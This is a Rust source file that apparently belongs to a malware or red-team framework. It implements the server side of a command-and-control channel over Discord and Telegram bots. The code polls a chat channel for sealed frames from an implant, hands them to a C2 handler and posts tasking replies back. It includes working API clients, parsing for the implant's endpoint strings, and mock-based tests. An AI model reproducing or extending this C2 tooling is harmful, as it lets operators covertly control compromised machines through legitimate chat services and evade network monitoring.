//! Server-side chat-platform C2 channels (Discord, Telegram).
//!
//! The implant can post a sealed frame into a chat channel and poll for the
//! operator's reply, but that is only half a callback loop: without a server
//! reading the same channel, the beacon posts into a void and is never tasked.
//! This module is the other half — it polls the channel, skips its own replies,
//! runs each frame through the normal sealed-envelope C2 handler, and posts the
//! reply back.
//!
//! Two distinct bot identities are expected, one for the C2 and one for the
//! beacon, sharing a channel, because Discord forbids bots from addressing each
//! other directly. The cursor is shared with the implant
//! (`nw_profile::chat`) so both ends agree on framing and on what counts as
//! "our own" traffic.
//!
//! The API base URL is overridable via `NW_DISCORD_API` / `NW_TELEGRAM_API` so
//! tests can point at a local mock instead of the live service.

use std::sync::Arc;
use std::time::Duration;

use crate::chat::Cursor;
use base64::Engine;
use serde::Deserialize;
use tracing;

/// One message read from a chat channel.
#[derive(Debug, Clone, Deserialize)]
pub struct ChatMessage {
    pub id: String,
    pub body: String,
}

/// A chat platform the C2 can post tasks into and read beacon traffic from.
///
/// Implemented for Discord and Telegram, and mocked in tests. Keeping the
/// channel behind a trait is what lets the loop be exercised without live
/// credentials.
#[async_trait::async_trait]
pub trait ChatChannel: Send + Sync {
    /// Post a message (the operator's sealed reply) into the channel, returning
    /// the platform message id.
    ///
    /// The id matters: the C2 records it as its own so the next poll does not
    /// read its own reply back as if it were beacon traffic, which would make
    /// the loop answer itself forever.
    async fn post(&self, body: &str) -> Result<String, String>;

    /// Read messages newer than the last poll, oldest first.
    async fn poll(&self) -> Result<Vec<ChatMessage>, String>;
}

/// Handler for one inbound sealed frame. Supplied by the caller so this module
/// stays independent of which C2 implementation is mounted.
pub type FrameHandler = Arc<
    dyn Fn(
            &[u8],
        )
            -> std::pin::Pin<Box<dyn std::future::Future<Output = Result<Vec<u8>, String>> + Send>>
        + Send
        + Sync,
>;

/// Poll the channel and service every beacon frame found.
///
/// Returns how many frames were handled. Stops on the first error so a token
/// that has expired or been revoked surfaces instead of spinning silently.
pub async fn service_once(
    channel: &dyn ChatChannel,
    cursor: &Cursor,
    handler: FrameHandler,
) -> Result<usize, String> {
    let messages = channel.poll().await?;
    let mut handled = 0usize;
    for message in messages {
        // `accept` skips anything the C2 itself posted and anything already
        // read, so this never re-processes its own replies.
        let Some(sealed) = cursor.accept(&message.id, &message.body) else {
            continue;
        };
        let reply = handler(&sealed).await?;
        let posted_id = channel.post(&crate::chat::encode_frame(&reply)).await?;
        // Mark our own reply so the next poll skips it instead of re-entering
        // with traffic this C2 generated.
        cursor.note_own(posted_id);
        handled += 1;
    }
    Ok(handled)
}

/// Run the channel loop until the process exits.
///
/// `interval` is how often the channel is polled; it is a C2 cost knob, so it
/// is deliberately explicit rather than hidden behind a default.
pub async fn serve(channel: Arc<dyn ChatChannel>, handler: FrameHandler, interval: Duration) {
    let cursor = Cursor::new();
    loop {
        match service_once(channel.as_ref(), &cursor, handler.clone()).await {
            Ok(0) => {}
            Ok(handled) => tracing::debug!(handled, "serviced chat channel frames"),
            Err(error) => {
                // Back off on failure so a revoked token or a rate limit does
                // not become a tight error loop against the API.
                tracing::warn!(%error, "chat channel poll failed");
                tokio::time::sleep(interval * 2).await;
                continue;
            }
        }
        tokio::time::sleep(interval).await;
    }
}

// ---------------------------------------------------------------- Discord

pub struct DiscordChannel {
    client: reqwest::Client,
    token: String,
    channel: String,
    api: String,
}

impl DiscordChannel {
    pub fn new(token: String, channel: String) -> Self {
        Self::with_api(token, channel, "https://discord.com/api/v10".to_owned())
    }

    pub fn with_api(token: String, channel: String, api: String) -> Self {
        Self {
            client: reqwest::Client::new(),
            token,
            channel,
            api,
        }
    }
}

#[async_trait::async_trait]
impl ChatChannel for DiscordChannel {
    async fn post(&self, body: &str) -> Result<String, String> {
        #[derive(Deserialize)]
        struct Created {
            id: String,
        }
        let created: Created = self
            .client
            .post(format!("{}/channels/{}/messages", self.api, self.channel))
            .bearer_auth(&self.token)
            .json(&serde_json::json!({ "content": body }))
            .send()
            .await
            .map_err(|e| format!("discord post failed: {e}"))?
            .error_for_status()
            .map_err(|e| format!("discord post rejected: {e}"))?
            .json()
            .await
            .map_err(|e| format!("discord post decode failed: {e}"))?;
        Ok(created.id)
    }

    async fn poll(&self) -> Result<Vec<ChatMessage>, String> {
        #[derive(Deserialize)]
        struct Raw {
            id: String,
            content: String,
        }
        let raw: Vec<Raw> = self
            .client
            .get(format!("{}/channels/{}/messages", self.api, self.channel))
            .bearer_auth(&self.token)
            .send()
            .await
            .map_err(|e| format!("discord poll failed: {e}"))?
            .error_for_status()
            .map_err(|e| format!("discord poll rejected: {e}"))?
            .json()
            .await
            .map_err(|e| format!("discord poll decode failed: {e}"))?;
        Ok(raw
            .into_iter()
            .map(|m| ChatMessage {
                id: m.id,
                body: m.content,
            })
            .collect())
    }
}

// ---------------------------------------------------------------- Telegram

pub struct TelegramChannel {
    client: reqwest::Client,
    token: String,
    chat_id: String,
    api: String,
}

impl TelegramChannel {
    pub fn new(token: String, chat_id: String) -> Self {
        Self::with_api(token, chat_id, "https://api.telegram.org".to_owned())
    }

    pub fn with_api(token: String, chat_id: String, api: String) -> Self {
        Self {
            client: reqwest::Client::new(),
            token,
            chat_id,
            api,
        }
    }
}

#[async_trait::async_trait]
impl ChatChannel for TelegramChannel {
    async fn post(&self, body: &str) -> Result<String, String> {
        #[derive(Deserialize)]
        struct Sent {
            message_id: i64,
        }
        let sent: Sent = self
            .client
            .post(format!("{}/bot{}/sendMessage", self.api, self.token))
            .json(&serde_json::json!({ "chat_id": self.chat_id, "text": body }))
            .send()
            .await
            .map_err(|e| format!("telegram post failed: {e}"))?
            .error_for_status()
            .map_err(|e| format!("telegram post rejected: {e}"))?
            .json()
            .await
            .map_err(|e| format!("telegram post decode failed: {e}"))?;
        Ok(sent.message_id.to_string())
    }

    async fn poll(&self) -> Result<Vec<ChatMessage>, String> {
        #[derive(Deserialize)]
        struct Envelope {
            result: Vec<Update>,
        }
        #[derive(Deserialize)]
        struct Update {
            message: Option<Message>,
        }
        #[derive(Deserialize)]
        struct Message {
            message_id: i64,
            text: Option<String>,
        }
        // An empty offset means "only new messages", which is what we want:
        // the cursor decides what is new, not Telegram's backlog.
        let envelope: Envelope = self
            .client
            .get(format!(
                "{}/bot{}/getUpdates?offset=-1&limit=50",
                self.api, self.token
            ))
            .send()
            .await
            .map_err(|e| format!("telegram poll failed: {e}"))?
            .error_for_status()
            .map_err(|e| format!("telegram poll rejected: {e}"))?
            .json()
            .await
            .map_err(|e| format!("telegram poll decode failed: {e}"))?;
        Ok(envelope
            .result
            .into_iter()
            .filter_map(|u| {
                let m = u.message?;
                Some(ChatMessage {
                    id: m.message_id.to_string(),
                    body: m.text?,
                })
            })
            .collect())
    }
}

/// Decode a base64 frame body, exposed so callers validating queued payloads
/// use the same tolerant rules as the channel itself.
pub fn decode_body(body: &str) -> Option<Vec<u8>> {
    crate::chat::decode_frame(body)
}

/// Encode a reply body for tests and for operators scripting a channel.
pub fn encode_body(sealed: &[u8]) -> String {
    base64::engine::general_purpose::STANDARD.encode(sealed)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::Mutex;

    /// In-memory channel standing in for Discord/Telegram.
    struct MockChannel {
        messages: Mutex<Vec<ChatMessage>>,
        /// (message id, body) pairs, so the mock can mint real ids.
        posted: Mutex<Vec<(String, String)>>,
        fail_poll: bool,
    }

    impl MockChannel {
        fn new() -> Arc<Self> {
            Self::build(false)
        }

        /// A channel whose poll always fails, standing in for an expired token
        /// or a revoked bot.
        fn failing() -> Arc<Self> {
            Self::build(true)
        }

        fn build(fail_poll: bool) -> Arc<Self> {
            Arc::new(Self {
                messages: Mutex::new(Vec::new()),
                posted: Mutex::new(Vec::new()),
                fail_poll,
            })
        }
        fn push(&self, id: &str, body: &str) {
            self.messages.lock().unwrap().push(ChatMessage {
                id: id.into(),
                body: body.into(),
            });
        }
        fn posted_id(&self) -> String {
            self.posted.lock().unwrap()[0].0.clone()
        }

        fn posted(&self) -> Vec<String> {
            self.posted
                .lock()
                .unwrap()
                .iter()
                .map(|(_, body)| body.clone())
                .collect()
        }
    }

    #[async_trait::async_trait]
    impl ChatChannel for MockChannel {
        async fn post(&self, body: &str) -> Result<String, String> {
            let mut posted = self.posted.lock().unwrap();
            let id = format!("c2-{}", posted.len() + 1);
            posted.push((id.clone(), body.to_owned()));
            Ok(id)
        }
        async fn poll(&self) -> Result<Vec<ChatMessage>, String> {
            if self.fail_poll {
                return Err("mock poll failure".into());
            }
            Ok(self.messages.lock().unwrap().clone())
        }
    }

    fn echo_handler() -> FrameHandler {
        Arc::new(|sealed: &[u8]| {
            let owned = sealed.to_vec();
            Box::pin(async move {
                let mut out = owned;
                out.push(b'!');
                Ok(out)
            })
        })
    }

    #[tokio::test]
    async fn a_beacon_frame_is_handled_and_answered() {
        let channel = MockChannel::new();
        channel.push("1", &encode_body(b"sealed-request"));
        let cursor = Cursor::new();

        let handled = service_once(channel.as_ref(), &cursor, echo_handler())
            .await
            .unwrap();

        assert_eq!(handled, 1);
        let posted = channel.posted();
        assert_eq!(posted.len(), 1, "exactly one reply posted");
        assert_eq!(
            crate::chat::decode_frame(&posted[0]).unwrap(),
            b"sealed-request!".to_vec()
        );
    }

    /// The loop must never re-process its own reply, or the C2 would answer
    /// itself forever.
    #[tokio::test]
    async fn the_c2_never_answers_its_own_reply() {
        let channel = MockChannel::new();
        channel.push("1", &encode_body(b"request"));
        let cursor = Cursor::new();

        service_once(channel.as_ref(), &cursor, echo_handler())
            .await
            .unwrap();
        // Feed the posted reply back in, as the real channel would on the next
        // poll. The id is the one the channel reported when posting.
        let reply_id = channel.posted_id();
        channel.push(&reply_id, channel.posted()[0].as_str());

        let handled = service_once(channel.as_ref(), &cursor, echo_handler())
            .await
            .unwrap();
        assert_eq!(handled, 0, "the C2 must not answer its own reply");
        assert_eq!(channel.posted().len(), 1, "no second reply posted");
    }

    /// Already-read ids must not be reprocessed even when the channel replays
    /// its history, which both Discord and Telegram do on restart.
    #[tokio::test]
    async fn replayed_history_is_not_reprocessed() {
        let channel = MockChannel::new();
        channel.push("1", &encode_body(b"request"));
        let cursor = Cursor::new();

        assert_eq!(
            service_once(channel.as_ref(), &cursor, echo_handler())
                .await
                .unwrap(),
            1
        );
        // Same message, polled again.
        assert_eq!(
            service_once(channel.as_ref(), &cursor, echo_handler())
                .await
                .unwrap(),
            0,
            "a replayed message must be ignored"
        );
    }

    #[tokio::test]
    async fn operator_chatter_is_ignored() {
        let channel = MockChannel::new();
        channel.push("1", "status update, no beacon here");
        let cursor = Cursor::new();

        assert_eq!(
            service_once(channel.as_ref(), &cursor, echo_handler())
                .await
                .unwrap(),
            0
        );
        assert!(channel.posted().is_empty());
    }

    #[tokio::test]
    async fn a_poll_failure_surfaces_instead_of_spinning() {
        let channel = MockChannel::failing();
        let cursor = Cursor::new();
        let err = service_once(channel.as_ref(), &cursor, echo_handler())
            .await
            .expect_err("a failing channel must report the error");
        assert!(err.contains("mock poll failure"), "{err}");
    }
}

/// Build a channel from an endpoint string, matching the implant's schemes.
///
/// Mirrors `Transport::from_endpoint` so an operator can move the same endpoint
/// string between the payload config and the server config without editing it.
pub fn channel_from_endpoint(endpoint: &str) -> Result<Arc<dyn ChatChannel>, String> {
    let (scheme, rest) = endpoint
        .split_once("://")
        .ok_or_else(|| format!("channel endpoint {endpoint:?} has no scheme"))?;
    let (token, address) = rest
        .split_once('@')
        .ok_or_else(|| format!("channel endpoint {endpoint:?} needs <token>@<address>"))?;
    if token.trim().is_empty() || address.trim().is_empty() {
        return Err(format!(
            "channel endpoint {endpoint:?} has an empty token or address"
        ));
    }
    match scheme {
        "discord" => Ok(Arc::new(DiscordChannel::new(
            token.to_owned(),
            address.to_owned(),
        ))),
        "telegram" => Ok(Arc::new(TelegramChannel::new(
            token.to_owned(),
            address.to_owned(),
        ))),
        other => Err(format!("unsupported chat channel scheme {other:?}")),
    }
}

#[cfg(test)]
mod endpoint_tests {
    use super::*;

    #[test]
    fn parses_the_implant_endpoint_forms() {
        assert!(channel_from_endpoint("discord://token@123456789").is_ok());
        assert!(channel_from_endpoint("telegram://token:chat@987").is_ok());
    }

    #[test]
    fn rejects_malformed_endpoints() {
        for bad in [
            "discord://token",
            "discord://@channel",
            "discord://token@",
            "sliver://token@channel",
            "no-scheme",
        ] {
            assert!(
                channel_from_endpoint(bad).is_err(),
                "{bad:?} should be rejected"
            );
        }
    }
}
